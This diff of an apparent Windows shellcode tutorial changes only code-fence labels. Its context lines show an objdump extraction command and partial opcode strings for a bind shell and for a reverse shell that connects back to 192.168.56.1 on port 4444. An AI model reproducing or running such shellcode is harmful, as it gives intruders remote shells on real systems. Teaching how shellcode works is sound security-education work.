@@ -546,7 +546,7 @@ If we were going to use the shellcode as a payload for an exploit, then we can e
 
 Compiled without LoadLibraryA() and WSAStartup().
 
-```text
+```bash
 $ for i in $(objdump -d shell.exe | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo
 \x31\xc0\x50\x50\x50\x50\x6a\x01\x6a\x02\xb8\x6a\x8b\xab\x71\xff\xd0\x89\xc3\x31
 \xc0\x50\xb8\x02\x01\x11\x5c\xfe\xcc\x50\x89\xe0\x6a\x10\x50\x53\xb8\x80\x44\xab
@@ -590,7 +590,7 @@ call eax
 ```
 
 The logic for the remote IP address is the following:
-```nasm
+```text
 82 = 130
 01 = 1
 A8 = 168
@@ -601,7 +601,7 @@ C0 = 192
 
 Compiled without LoadLibraryA() and WSAStartup().
 
-```text
+```bash
 $ for i in $(objdump -d reverse.exe | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo
 \x31\xc0\x50\x50\x50\x50\x6a\x01\x6a\x02\xb8\x6a\x8b\xab\x71\xff\xd0\x89\xc3\x68
 \xc0\xa8\x38\x01\xb8\x02\x01\x11\x5c\xfe\xcc\x50\x89\xe6\x31\xc0\xb0\x10\x50\x56
